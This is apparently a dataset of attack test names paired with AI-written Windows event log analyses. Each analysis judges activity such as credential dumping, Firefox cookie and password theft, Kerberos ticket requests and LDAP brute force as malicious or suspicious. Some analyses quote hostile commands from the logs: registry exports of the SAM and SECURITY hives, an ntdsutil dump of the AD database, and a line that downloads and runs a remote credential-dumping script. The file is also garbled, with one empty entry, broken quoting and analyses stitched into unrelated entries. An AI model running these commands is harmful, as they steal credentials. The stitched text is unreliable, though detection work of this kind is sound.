   - Review the copied Edge user data files for unauthorized access or data theft indications.
   - Check for unauthorized user accounts or elevated privilege users on the system.

2. **Forensic Analysis:**
   - Conduct a full forensic disk image of `Server002` for a comprehensive analysis.
   - Examine the timeline and sequence of events for any indication of unauthorized remote access.

3. **Monitoring and Mitigation:**
   - Increase monitoring on the affected system and within the network for similar activities.
   - Use threat intelligence to compare the observed patterns against known tactics, techniques, and procedures (TTPs) used by attackers.

4. **Audit and Review:**
   - Review account access and apply stricter security policies, such as multi-factor authentication (MFA).
   - Consider conducting a security awareness training session focusing on recognizing suspicious activity, especially by privileged users.

This set of actions should help determine the root cause of the suspicious activities and prevent further incidents."
PowerDump Hashes and Usernames from Registry,"After reviewing the provided Windows event logs, here is the detailed analysis:

1. **System Log:**
   - The logs show normal Windows Update activity, specifically the update of Microsoft Defender Antivirus. This appears to be typical and does not indicate any potential threats.

2. **Sysmon Log:**
   - Multiple instances of command-line execution are observed, particularly with `powershell.exe` and `conhost.exe`. PowerShell is executed with a script aimed at disabling Defender real-time monitoring (`Disable DEFENDER REALTIME MON`) and importing a script named `PowerDump.ps1` from a temporary directory. 
     - **Event ID 1 (Process Creation):** The `powershell.exe` is executing potentially malicious content since it attempts to bypass security by disabling Defender real-time monitoring and importing a potentially malicious script.
     - Invoking scripts like PowerDump through PowerShell and attempting to disable Windows Defender are common tactics in malware or unauthorized administrative access scenarios.
   - Usage of `wevtutil.exe` is also noted frequently. This utility is legitimate but can be used for log manipulation, particularly if used in conjunction with obfuscation or deletion.
   
3. **Windows PowerShell Log:**
   - The PowerShell event logs confirm the execution of the script that attempts to alter Defender settings and import the suspicious `PowerDump.ps1` script. This raised further suspicion about unauthorized activity.

4. **Security and Application Logs:**
   - Windows Defender status remains `SECURITY_PRODUCT_STATE_ON`, indicating Defender reactivates after the PowerShell script completes. However, efforts to interfere with its functionality were observed.

**Assessment:**
- **Suspicious Observations:**
  - The attempt to disable/modify Windows Defender settings using PowerShell suggests a potentially significant security risk.
  - Importing and executing scripts like `PowerDump.ps1` indicates malicious intent, as such scripts can dump or manipulate sensitive data from memory.

- **Benign Observations:**
  - Routine updating actions, as reflected in parts of the system and application logs, align with typical system operations without indicating compromise.

**Recommendations:**
- Conduct a thorough review of `PowerDump.ps1` to determine its specific actions and capabilities.
- Investigate the origin and intent behind the commands that attempted to disable Defender.
- Ensure PowerShell logging is enabled and enhanced security measures (like AppLocker) for PowerShell execution policies are applied.

**Resolution:** The behavior observed in the logs dictates the classification as **MALICIOUS**, necessitating immediate and thorough investigation and response to prevent potential threats or data breaches."
Dump Active Directory Database with NTDSUtil,"### **Log Analysis Summary**

Upon reviewing the provided Windows event logs, there are a few points of interest and some activities that might be considered unusual, particularly on a server environment identified as ""Server002."" Below is the detailed analysis:

#### **Suspicious Details**

1. **Registry Query**:
   - **Process**: `reg.exe`
   - **Command Line**: `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions /v ProductType`
   - **User**: `SERVER002\admin_test`

   This could be a legitimate query to determine the server type (e.g., checking if the machine is a domain controller), but the context is key. If this is a regular activity by an admin, it may be justified; however, if `admin_test` isn't a recognized administrator performing regular checks, this behavior might warrant further investigation.

2. **Information Gathering Commands**:
   - **whoami.exe**: This command provides details about user context, often used in post-exploitation scenarios by intruders to gather account information.
   - **Commands like ""HOSTNAME.EXE""**: This provides system identification, which might relate to situational awareness in case of malicious activity.

3. **Unusual Process Creation**:
   - **Process**: `ntdsutil`
   - **Command Line**: `cmd.exe /c mkdir C:\Windows\Temp\ntds_data & ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_data"" q q`

   This command is used traditionally for backups of AD database or to create installation media. If not initiated by a legitimate admin activity, this might be of concern, especially since `ntdsutil` is a powerful tool used in AD environments.

4. **Frequent Execution of Windows Utility Processes**:
   - Numerous instances of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` among others. Rapid succession in short time frames could be part of a scripted or automated task; however, matching these actions to a known IT task is necessary to rule out malicious intent.

5. **System Level Changes**:
   - **Edge Installation**: Logs show `Microsoft Edge Installer` running multiple instances updating software. This could be regular updating behavior but should be verified against expected software update schedules.
   - **Malware Definition Update**: Activities related to `AM_Delta.exe` and `MpSigStub.exe` for updating security definitions can also be considered routine, but it should conform to scheduled updates.

#### **Security Log Events**

- **Event ID 5379**: No credentials were returned for operations related to MicrosoftAccounts, which can sometimes be normal but repeated occurrences need checking to ensure they are expected.

### **Assessment**

Based on the behavior indicated in the logs:

1. **Registry checks, user information gathering** and **creation of NTDS data** suggests potential reconnaissance or preparation for data exfiltration if these actions are unauthorized.
2. If `admin_test` is a legitimate administrative user conducting routine maintenance or query tasks, this could explain some of the above actions.
3. The frequent execution of utility processes and system changes like software updates needs correlation with legitimate administrative tasks.

### **Resolution: SUSPICIOUS**

The activities recorded in these logs, particularly the use of `ntdsutil` and command execution involving `whoami.exe` and `reg.exe` under potentially unauthorized user context, are considered **SUSPICIOUS**. Therefore, a deeper investigation is required to confirm the legitimacy of these actions to rule out misuse or compromise.

### **Recommended Actions**

1. **Verify User**: Check the authenticity and recent activities of the `admin_test` account. Confirm if the tasks performed align with their duties.
2. **Examine Process Context**: Look for process creations and command-line activity outside normal change windows or from non-standard user accounts.
3. **Check for Further Indicators**: Review additional logs or contextual information (e.g., network logs) for broader investigation, assessing if there are any successful exploitations or data exfiltration attempts.
4. **Consider Segmentation and Hardening**: If not already done, restrict administrative privileges and monitor user activities closely, especially on critical systems."
Decrypt Mozilla Passwords with Firepwd.py,"### Detailed Analysis of Logs:

Upon reviewing the provided Windows event logs, several points of interest and potential indicators of malicious activity are identified:

#### Windows PowerShell Logs:

1. **PowerShell Commands:**
   - The execution of PowerShell commands aims to access Mozilla Firefox profiles to extract stored passwords using `Firepwd.py`. The script is executed via a Python interpreter located in a temporary folder, which might be unusual, especially for an administrative user.
   - Command-Line:
     ```shell
     powershell.exe & {$PasswordDBLocation = get-childitem -path ""$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\""; cmd /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\venv_data.004\Scripts\python.exe C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\venv_data.004\Scripts\Firepwd.py -d $PasswordDBLocation > $env:temp\data.003Test8.txt; cat $env:temp\data.003Test8.txt}
     ```
   - **Suspicious Activity:**
     - The retrieval and dumping of password data suggest attempts to exfiltrate sensitive information.
     - The use of temporary directories to run potentially harmful scripts can be indicative of malicious behavior aiming to evade standard security measures.

"Dumping of SAM, creds, and secrets(Reg Export)","After reviewing the provided Windows event logs, several observations and points are noteworthy, indicating potentially suspicious and possibly malicious activities:

1. **Unusual Registry Access**: There are Sysmon logs of `cmd.exe` executing commands to export sensitive registry hives (HKLM\SAM, HKLM\SYSTEM, and HKLM\SECURITY) to the temporary directory using the command:  
   `cmd.exe /c reg export HKLM\sam %%temp%%\sam & reg export HKLM\system %%temp%%\system & reg export HKLM\security %%temp%%\security`.  
   This type of activity is highly suspicious as it suggests potential credential dumping attempts, a tactic commonly seen in malware or during manual hacking attempts.

2. **High Integrity Level**: The processes performing these actions, such as `whoami.exe`, `cmd.exe`, and `reg.exe`, are running at a high integrity level, which could indicate an exploitation of elevated privileges.

3. **Command Execution Patterns**: The execution pattern shown in the logs, especially with `whoami.exe` and `hostname.exe`, appears systematic and targeted rather than routine administrative operations. This could imply some form of reconnaissance or environment profiling being executed on the host.

4. **Conhost Execution**: The repeated launching of `conhost.exe`, serving as the console window host for command-line based processes, links to potentially automated or semi-automated scripts executing commands. While not inherently malicious, the context here suggests orchestration of multiple command processes that could align with malicious scripts execution workflows.

5. **Wevtutil Execution**: The presence of `wevtutil.exe` being executed could suggest attempts to interact with the Event Viewer or even clear logs, further supporting potential concealment tactics.

Considering the context and the event logs provided, the following assessment applies:

- **Assessment**: The activities and patterns observed in these logs align with known malicious behaviors, especially regarding the registry export commands and their execution flow. This aligns with possible credential theft or system compromise activities.

- **Resolution**: **MALICIOUS**. The evidence strongly indicates that there is malicious activity occurring, consistent with credential dumping techniques and possibly other stages of a broader attack or persistent threat activity.

**Guidance**:
1. **Immediate Containment**: If these activities are unexpected and unauthorized, isolate the system from the network to prevent potential lateral movement or additional compromises.
2. **Comprehensive Investigation**: Conduct a full forensic investigation to identify the origin of these commands and assess the full impact on the system.
3. **Credential Protection**: Given evidence of registry hive exportation, consider all credentials on the system compromised and initiate a password reset across all potentially affected accounts.
4. **Monitoring and Threat Hunting**: Increase monitoring on related systems for similar patterns of behavior and look for other indicators of compromise across the network.
5. **Patch and Update**: Ensure all systems, including the investigated host, are fully patched against known vulnerabilities, and reassess security policies for potential gaps exploited during this incident.

These events indicate that Python was successfully installed and integrated, with the path adjusted. The user associated is identified as `admin_test`.

2. **Microsoft-Windows-RestartManager**: Events with EventID `10001` and `10000` show restart manager activities carried alongside the Python installation. There's no anomaly in these restart events since they align with installation procedures.

#### Sysmon Log

1. **Process Creation Events**: There are multiple process creation events (EventID `1`) associated with the execution of `msiexec.exe`, `python.exe`, `wevtutil.exe`, and `cmd.exe`. Notably:
   - `cmd.exe` executed ""pypykatz live lsa"", which is a known credential dumping tool targeting the Local Security Authority Subsystem Service (LSASS). This indicates an attempt to extract credentials from the system, which is considered highly malicious.
   - Various Python-related execution entries suggest someone was managing Python packages or running scripts, which isn't inherently suspicious unless coupled with other activities.

2. **Anomalous Execution Patterns**: The execution of several utilities like `wevtutil.exe` and `cmd.exe` along with ""hostname"" and ""whoami"" commands doesn't seem irregular but can be tools used for reconnaissance or system status interrogation under malicious intents, especially when done by a non-administrative process or user.

#### Windows PowerShell Log

1. **Potential Malicious PowerShell Activity**: The PowerShell event shows the download and execution of `python-3.10.4-amd64.exe` using `invoke-webrequest` from the official Python website. While downloading directly via PowerShell isn't suspicious alone, it suggests scripting capabilities which could be leveraged to download additional malicious payloads if not properly vetted.

2. **Script Execution**: The creation and execution of a new process (`python_setup.exe`) via PowerShell that aligns with earlier Sysmon logs raises red flags especially as it ran with `/quiet` and other flags, possibly to avoid drawing attention during the installation process.

### Threat Assessment and Resolution

Based upon the log analysis, the use of `pypykatz` indicates suspicious or outright malicious intent given its purpose in credential theft. The combination of command executions and PowerShell activities, though seemingly benign by themselves, build a case for potential security compromise when combined with credential dumping attempts.

#### Resolution: MALICIOUS

**Threats/Risks Identified**:
- Use of `pypykatz` strongly suggests a malicious actor probing or actively engaging in credential theft.
- Executions through PowerShell with external downloads, although socially expected, reinforces unauthorized activities aimed at data exfiltration or system compromise.

Create Volume Shadow Copy with diskshadow,"Reviewing the provided logs from the Windows host, I have identified several events that could suggest suspicious activity. Below is a detailed analysis:

### Suspicious/Anomalous Behavior:
1. **Time Change Events**:
   - The system time appears to have been changed as indicated by Event ID 4616 in the Security log and Event ID 1 in the System log. Time changes can be a normal administrative activity but can also be used maliciously to evade detection or to sync with an external attack schedule.

2. **Administrative Privileges and NTLM Authentication**:
   - Event ID 4672 in the Security log shows the user `admin_test` logging in and being granted administrative privileges including sensitive ones like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeRemoteShutdownPrivilege`. The use of NTLM authentication and external workstation `DESKTOP-3HL5B2P` is peculiar and could suggest lateral movement or an external attacker leveraging stolen credentials.

3. **Process Executions**:
   - Sysmon logs show multiple executions involving critical system files with high integrity levels:
     - **`cmd.exe` Execution**: The command line includes `mkdir c:\exfil` and execution of `diskshadow.exe` which could indicate data exfiltration efforts or shadow copy manipulation, a technique used to evade anti-virus detection.
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `admin_test` could indicate an attempt to manipulate event logs or cover tracks.

### Evaluation of Malicious Indicators:
1. **Cmd.exe Activity**: Creating a directory named `exfil` coupled with diskshadow operations could strongly suggest malicious intent focused on data exfiltration.
2. **Privilege Escalation**: The acquisition of extensive privileges by `admin_test` without context suggests potential unauthorized use.
3. **System Time Modifications**: While not outright malicious, such changes without context provided can indicate attempts to hide or adjust timestamps related to unauthorized activities.
4. **Multiple Credential Access Events (Event ID 5379)**: Indicates attempts to access credentials potentially used maliciously.

### Conclusion and Recommendation:
- **Resolution**: **MALICIOUS**
  - The combination of suspected data exfiltration activity, abnormal use of powerful system utilities, acquisition of sensitive privileges, and suspicious authentication from an external host are strong indicators of malicious behavior.
  
- **Actions to Proceed**:
  1. Immediately isolate the host `Server002` from the network to prevent further unauthorized activities.
  2. Engage in forensic analysis to capture volatile data and detailed investigation of the `admin_test` account activities for additional context.
  3. Review and correlate network logs to determine potential data exfiltration and unauthorized external connections.

WinPwn - sensitivefiles,"## Analysis of Windows Event Logs

### Indicators of Malicious Activity:

#### 1. **Suspicious PowerShell Activity:**
   - A PowerShell script was executed (Captured in the Sysmon and PowerShell logs), which downloaded and executed code from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). 
   - This behavior is a classic example of potential malware or PowerShell-based exploitation, where a script is fetched from the internet and executed, often leading to compromise.

#### 2. **Process Execution:**
   - Several Sysmon logs indicate multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While these processes aren't inherently malicious, the frequency and the context of execution alongside PowerShell activity might suggest attempts to log or manipulate event logs or processes.
   - The critical PowerShell command includes the execution of a script meant for sensitive file checks typically used in security penetration testing.

#### 3. **Edge Update Executions:**
   - Frequent executions of the Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) can be seen throughout the logs. While the repetitive nature of these updates can occur, if seen alongside any PowerShell scripts that are external or if the update process is utilized for establishing persistence or privilege, it becomes more suspicious.

### Assessment:
- **PowerShell Download and Execution:** This is a clear indicator of potentially malicious activity. The command line argument executing a downloaded script from the internet marks significant risk as it indicates system compromise via downloaded and executed scripts.
  
- **Wevtutil Executions**: Combined with PowerShell's external script completion, this could suggest attempts to hide tracks by clearing logs.

### Resolution:
The actions from the logs indicate the likelihood of malicious activity based on the execution of an external script using PowerShell. Given the potential compromise indicated by the downloaded script from an external source and the process executions, this system should be assumed as potentially COMPROMISED.

Request All Tickets via PowerShell,"After analyzing the provided Windows event logs, the following observations and assessments have been made:

### Suspicious Activities Observed:
1. **PowerShell Execution with SetSPN and Token Creation:**
   - In the Sysmon logs and PowerShell logs, there's a command involving PowerShell execution with `Add-Type -AssemblyName System.IdentityModel`, `setspn.exe`, and `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken`. This command modifies domain-related service principal names (SPNs) and may indicate Kerberos ticket manipulation or reconnaissance for Kerberos-based privilege escalation attacks.

2. **Conhost.exe Instances:**
   - Multiple instances of `conhost.exe` were spawned in conjunction with PowerShell actions. While `conhost.exe` is a normal part of running console applications, its activity alongside PowerShell indicates involvement in command execution.

3. **Edge Update Processes:**
   - There are numerous entries related to Microsoft Edge Update services. While these could be regular update processes, the volume and frequency, along with the current focus on potential misuse of benign programs to perform operations (""living off the land"" techniques), raise questions if these processes are masquerading or being misused.

### Areas of Concern:
- **Command Line Content and Identity Tokens:**
  - The specific PowerShell command utilizes identity tokens which can be part of a strategy to access information or systems by masquerading tokens.
  
- **User Context:**
  - The actions were performed under the user `SERVER002\admin_test` which indicates that an administrative user is executing these actions. This could either imply authorized administrative tasks or an initial step in lateral movement by a threat actor.

### Recommendation and Resolution:
- **Additional Investigation Required:**
  - The PowerShell activity involving `setspn.exe` and Kerberos tokens should be reviewed for legitimacy by checking corresponding Active Directory logs.
  - Validate the user `admin_test` and review if this activity matches expected usage for this account.
  - Scrutinize network logs to identify any unusual outbound connections or data exfiltration attempts related to this timeframe.
  - Evaluate the Edge Update logs and processes for potential masquerading or unusual times of execution.

### Conclusion:
Based on the logged events, the activities appear potentially harmful or preparatory for a possible compromise, given the use of PowerShell scripts that manipulate SPNs and utilize identity tokens along with the administrative context, which is often indicative of privilege escalation attempts.

**Resolution:** SUSPICIOUS

The logs contain activities that warrant further investigation to confirm or dismiss any malicious intent. Further steps should be taken to confirm the legitimacy of the procedures observed."
Dump svchost.exe to gather RDP credentials,"Upon analyzing the provided log entries, several events and activities stand out as potentially suspicious and warrant investigation. Let's breakdown the key observations from the Windows PowerShell, Security, and Sysmon logs:

### Suspicious Activities Identified:

1. **PowerShell Execution:**
   - There are multiple PowerShell logs with the same script execution across different logs (EventRecordID 1043 to 1050). The script is attempting to check for an established connection on port 3389 (commonly used for RDP) and execute a MiniDump using `rundll32.exe` calling `comsvcs.dll`. This technique can be used for process dumping, which is often associated with malicious activities such as credential dumping. The use of `rundll32.exe` in this manner is highly suspicious.

2. **Privilege Escalation:**
   - Security logs reveal that the user ""admin_test"" had logon events (EventID 4624) and was granted special privileges (EventID 4672) like `SeDebugPrivilege`, which allows processes to debug others, a capability typically restricted to administrative tasks and often abused by attackers for privilege escalation.

3. **Process Creation and Execution of System Utilities:**
   - The Sysmon log entries show multiple system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` being executed. While these utilities are legitimate, their use in conjunction with PowerShell and the specific script could indicate enumeration or further reconnaissance activities by a potential attacker.

4. **Unusual Processes:**
   - There are frequent executions of processes such as `wevtutil.exe` and `conhost.exe` by the user `admin_test`, which can indicate scripting or automated task sequences often used in compromise scenarios.

### Assessment of Situation:

Based on the logs, there are multiple potentially suspicious indicators and behaviors that suggest malicious activity:

- The PowerShell script and its execution context appear to be tailored for dumping credentials or exploring processes in memory, indicative of potential lateral movement or data exfiltration preparations.
- Users with privileged access executing scripts with capabilities to perform tasks associated with credential theft.
- Repeated use of system utilities in a scripted or automated manner indicative of potential reconnaissance or follow-up actions post-compromise.

### Recommendation & Resolution:

- **Immediate Investigation Required**: The identified patterns and activities strongly suggest malicious intent, specifically aligning with phases of a cyber attack focused on credential access and persistence.
- **Response Actions**: It is critical to verify the origin and intent of the scripts found in the PowerShell logs. Investigate the `admin_test` user account activities for legitimacy and restrict potentially malicious scripts/schedules from running further.
- **Monitor and Audit**: Increase monitoring of similar actions across the network to pre-emptively detect and mitigate any similar threats, and ensure that security patches and updates are applied to systems.

**Final Resolution: MALICIOUS**

Given the evidence and potential for compromise evident in these logs, there is a strong indication of a malicious threat actor's activities warranting immediate attention and investigation."
Export Root Certificate with Export-Certificate,"Upon analyzing the provided logs, several observations can be made that warrant attention:

1. **Frequent Process Execution**: The logs indicate frequent execution of core system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and especially `powershell.exe`. While some of these utilities, like `wevtutil.exe` and `conhost.exe`, are standard on Windows systems for managing event logs and hosting command line windows respectively, their frequent invocation in quick succession can be suspicious, especially when run under the same user `SERVER002\admin_test`.

2. **PowerShell Activity**: There is a notable PowerShell script execution found in the logs. The command uses `New-SelfSignedCertificate`, `Set-Location`, and `Export-Certificate`, which suggests that a self-signed certificate is being created and exported. This can be considered suspicious as it might pertain to setting up new cryptographic credentials, potentially for unauthorized access or exfiltration.

3. **Time Discrepancy**: There are events indicating a time change in the system's clock (`EventID: 4616` in the Security log and `EventID: 1` in the System log). Changing the system time can be a method used by attackers to evade detection or alter logs forensics.

4. **Privilege Escalation**: The `EventID: 4672` in the Security log shows that the `admin_test` user was assigned several high privileges, including `SeDebugPrivilege`, which is often exploited for privilege escalation purposes.

5. **Network Service Account Processes**: Processes like `svchost.exe` and `sppsvc.exe` running under `NT AUTHORITY` accounts (i.e., SYSTEM or NETWORK SERVICE) are typical for legitimate system activities like hosting services. However, these should be scrutinized if they appear linked to other suspicious activities.

Assessment & Resolution:
- The execution of PowerShell scripts involving certificate creation and export is a potential indicator of unauthorized actions, particularly given the context of privilege escalation events and time manipulation.
- While some processes logged are standard, the suspicious concentration and combination of activities, like frequent system utility executions, adjusting the system clock, and manipulating certificates, raises concerns.

Resolution: **SUSPICIOUS** - The activities logged are suspicious and suggest an increased risk of malicious activity. Further in-depth investigation is warranted, especially focusing on the intent behind the PowerShell script and time adjustment. Recommended actions include:
- Conduct a detailed review of the activities executed by `SERVER002\admin_test`.
- Correlate the Event logs with external threat intelligence to ascertain whether the commands executed align with known attack patterns.
- Inspect any newly created certificates or authentication mechanisms for legitimacy.
- Continuous monitoring to rapidly identify any subsequent anomalies or policy violations."
Steal Firefox Cookies (Windows),"Upon reviewing the provided Sysmon and Windows PowerShell logs, several indicators suggest potentially malicious behavior on the host, Server002. Here is a detailed analysis:

   - **PowerShell Activity**: Multiple entries indicate the use of PowerShell to execute commands, notably one with a complex command aimed at extracting data from Firefox's cookie database.
     - The command retrieves cookies from the Firefox browser profiles and outputs them into a text file. Such activity is highly suspicious as it aligns with tactics used in credential theft or reconnaissance to collect sensitive user information.
     - The use of `stop-process -name ""firefox"" -force` indicates an attempt to terminate Firefox, possibly to ensure that the file is not in use when trying to access it.

2. **Command and Control:**
   - The command-line activity involves `cmd.exe` and `sqlite3.exe`, a common practice for exfiltrating data in a format that's easily transferable. 
   - The presence of SQLite tools in a temp directory and their use in extracting cookie data further supports the notion of unauthorized data extraction.

3. **Integrity Level and User Context:**
   - Many of the processes are executed by the user `SERVER002\\admin_test` with a high integrity level, indicating they have significant system privileges, potentially elevating the risk if the account is compromised.
   - The consistent high integrity level with PowerShell sessions could suggest privilege escalation.

4. **Notable Absence of Logs:**
   - There are no anomalies observed in the provided Application, System, or Security logs; however, the absence of entries in these logs does not negate the suspicious behavior identified through Sysmon and PowerShell logs.

5. **Suspicious Script Behavior:**
   - The use of PowerShell scripting in conjunction with external tools like `sqlite3.exe` executed from temporary folders suggests an operational behavior resembling that used in malicious activities to avoid detection and maintain persistence.

**Resolution Assessment:**
Given the outlined behavior and observed actions, this activity strongly indicates a potential compromise aiming to collect and possibly exfiltrate sensitive data through cookie theft. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent further data exfiltration and unauthorized access.
- **Credential Review and Reset**: Review the accounts associated with the suspicious activities, especially `admin_test`, and mandate a password change. Evaluate if multifactor authentication is enabled and implement it if not.
- **Comprehensive System Scan**: Conduct a thorough scan of Server002 for malware and other indicators of compromise using up-to-date security tools.
- **Log and Event Analysis**: Intensify monitoring of logs across potentially affected systems within the network for similar patterns.

Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],"Upon analyzing the provided logs from the Windows host, I've identified several key points that dictate the current state of this system.

### System Logs:
1. **Kernel-General Events (Event ID 1 & 24):** These logs reflect normal activities related to time adjustments and system operations handled by `svchost.exe`. The time adjustments are associated with synchronization to `time.windows.com`, indicating typical system behavior to ensure accurate timekeeping.

2. **Microsoft-Windows-Time-Service (Event ID 35):** This shows the Windows Time Service selecting a time source. This event is normal and expected as part of system operations.

### Windows PowerShell Logs:
These logs show that multiple PowerShell sessions were opened with the command, `vaultcmd /listcreds:""Windows Credentials"" /all`, executed. This command is utilized to list credentials stored in the Windows Vault. While this activity can be associated with administrative or automation tasks, it can also be suspicious if unexpected as it involves accessing stored credentials.

### Application Logs:
1. **edgeupdate Logs:** These events indicate a normal service stop of the Edge Update service, which occurs naturally as the system manages updates. No anomalies detected here.

### Sysmon Logs:
1. **Process Creations (Event ID 1 & 5):** 
   - The execution of utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` in varying combinations are typical and often seen in automated scripts for system management.
   - However, the presence of `VaultCmd.exe` warrants attention as it is tied to accessing system credentials, aligning with the observed PowerShell activity.
   - The repeated invocations and clean-up routines of Microsoft Edge Update processes show expected behavior with service and update operations.

### Security Logs:
1. **Time Change Events (Event ID 4616):** These confirm legitimate system time synchronization using `svchost.exe`.

### Overall Assessment:
- The combination of PowerShell activity (`vaultcmd` command execution), Sysmon process executions involving credential access, and interactions with `VaultCmd.exe` collectively suggests potential credential enumeration attempts.
- Despite the normal appearances and expected behavior in system, application, and part of Sysmon logs, the nature of the PowerShell commands executed raises significant concerns, primarily when accessed credentials are not anticipated by users or administrators.

### Final Resolution:
- **SUSPICIOUS**: The presence of credential enumeration commands without clear context or justification suggests that further investigation is necessary to determine intent and context. Validate with the system administrators whether this activity aligns with planned maintenance, scripts, or official monitoring practices.

### Recommended Next Steps:
1. Review administrative scripts and planned activities during this timeframe to verify legitimate use.
2. Check user access logs and communications to confirm authorized actions.
3. Consider enhancing monitoring of credential-related activities for this host, with tailored alerts for anomalous usage patterns.
4. If unauthorized access is suspected, initiate a deeper forensic analysis to uncover any potential breaches, and evaluate the need for incident response protocols."
Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos),"Upon reviewing the provided logs, several entries indicate potentially malicious activity, particularly within the PowerShell logs. Let's break down the observations by log type:

### Security Logs:
- The logs show some time change (EventID: 4616) related to `svchost.exe`. This is often legitimate, but frequent and unexplained time changes could indicate attempts to manipulate timestamps within the system for malicious purposes. However, more context is needed to conclude if this is truly problematic.

### Windows PowerShell Logs:
- Multiple PowerShell events are referencing a script that appears to be attempting a brute force attack on user credentials (`EventID: 600`). 
- The script reads passwords from `passwords.txt` in the user's temp directory and attempts to authenticate using NTLM against the user's domain. The clear presence of a loop trying different passwords suggests credential scanning activity.

### Sysmon Logs:
- There are numerous Sysmon events relating to processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` executed by the `admin_test` user. The presence of `wevtutil.exe` executions can be common in administrative tasks (logging/event management), yet in the absence of normal administrative context (e.g., during an active PowerShell script attack), it could also indicate events log clearing attempts.
- The presence of `powershell.exe` in the Sysmon logs further corroborates the suspicious activity indicated in the PowerShell logs.
  
### System Logs:
- Again, some indicator of system time adjustments similar to what we observed in the security logs, initiated by `svchost.exe`. This should be correlated with known system maintenance activities.

### Application Logs:
- A log from the Software Protection Platform Service appears routine but should be correlated with any license or maintenance activities to rule out subversion attempts.

### Analysis:
The consistent theme across the logs, especially from the PowerShell logs, indicates that a brute force attempt was being conducted using PowerShell scripts. The presence of such a script strongly points to network compromise or an insider threat activity. The activities surrounding `powershell.exe`, combined with attempts to authenticate passwords against usernames, are typical signs of credential harvesting or lateral movement attempts.

Given these observations, the logs contain activity that is considered **MALICIOUS**:

### Resolution:
- **MALICIOUS**: The PowerShell activities specifically demonstrate a clear attempt to brute force credentials, which is a strong indicator of a compromise or an ongoing attack. Immediate steps should be taken to contain and investigate further.

### Guidance:
1. **Containment**: Isolate the affected system (Server002) from the network to prevent further credential exposure or propagation of the potential attack.
2. **Investigation**: Conduct a full forensic investigation to determine the attack's source, method, and extent, focusing on the origin of the PowerShell script.
3. **Remediation**: Reset passwords for all accounts accessible from Server002 and review user account activities throughout the network.
4. **Monitoring**: Increase monitoring efforts across systems to detect any other unusual or unauthorized activities, especially looking out for similar PowerShell script activities."
Dump LSASS.exe Memory using NanoDump,"Based on the analysis of the provided Windows event logs, here is a detailed breakdown of the findings:

Dump credentials from Windows Credential Manager With PowerShell [web Credentials],"### Analysis of the Logs

**Suspicious Behavior and Events:**

1. **PowerShell Execution:**

   - The logs indicate the execution of PowerShell with a command-line argument fetching and executing a script from an external URL. The specific command is:
     ```
     & {IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}
     ```
       
   - This is suspicious because:
     - It uses `IEX` (Invoke-Expression) which can execute a script payload, a common technique in attacks to execute scripts directly from the internet.
     - The URL hosts a script designed to interact with the Windows Credential Manager, potentially aiming to extract credentials, a behavior associated with credential theft attacks.

2. **Use of Administrative Tools (wevtutil.exe and whoami.exe):**

   - The frequent execution of `wevtutil.exe` and `whoami.exe` appears in the logs, with `wevtutil.exe` being invoked multiple times.
   - `wevtutil.exe` is a command-line utility used to manage event logs. Its frequent invocation can be benign in administrative contexts but can also point to log clearing or auditing by attackers.
   - `whoami.exe` is used to gain access information, which is relatively benign unless used excessively or in a suspicious sequence of activities.

3. **Execution Context:**

   - Several processes are running under the `NT AUTHORITY\SYSTEM` account, which is a high-privilege account. While this is not inherently malicious, it emphasizes the potential impact of the activity if it were harmful, given the privileged context.

4. **Temporary Directories:**

   - The execution of `MicrosoftEdgeUpdate.exe` from a TEMP directory could signify non-standard or suspicious installation behavior.
   - Temporary directories are often used by malware to execute payloads seamlessly without detection.

     - **EventID 5:** The logs show PowerShell being executed by the user `SERVER002\admin_test` with the binary `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. While PowerShell execution is common, it's important in a security context to scrutinize for potentially malicious operations. Unfortunately, the log entries don't provide specific command-line arguments or scripts executed, which makes it hard to determine intent from these entries alone.
   
   - **Wevtutil and Conhost Executions:**
     - Frequent execution of `wevtutil.exe` and `conhost.exe` by the same user, `SERVER002\admin_test`, is observed. `wevtutil.exe` is used for manipulating event logs and could be suspicious if leveraged to clear logs or hide tracks by attackers. However, the logs don’t show any arguments that suggest the malicious use of `wevtutil.exe`. 
   
   - **Cmd and PsExec Usage:**
     - **EventID 1:** The execution of `cmd.exe` with a command involving `PsExec.exe` is noteworthy. PsExec is a legitimate utility used for executing processes on remote systems but is often used by attackers to execute commands with elevated privileges. The command is saving registry secrets to a temporary file, which is a suspicious activity indicating potential data exfiltration or credential dumping.

2. **System Logs:**
   - System logs include normal Windows update operations such as execution of `wuauclt.exe`, `AM_Delta.exe`, and updates related to Microsoft Defender Antivirus. This suggests regular system maintenance activity.

3. **Application Logs:**
   - Windows Defender Status: A log entry shows Windows Defender is active, which is a positive security indicator for malware protection.
   - SPP (Software Protection Platform): Logs refer to regular operations and rules engine operations, nothing particularly suspicious here.

4. **Security & PowerShell Logs:**
   - No logs were provided for security and PowerShell channels. These logs are crucial for understanding user authentication events and command activity details.

Send NTLM Hash with RPC Test Connection,"Upon reviewing the provided Windows event logs, several points warrant further analysis:

1. **Sysmon Logs:**
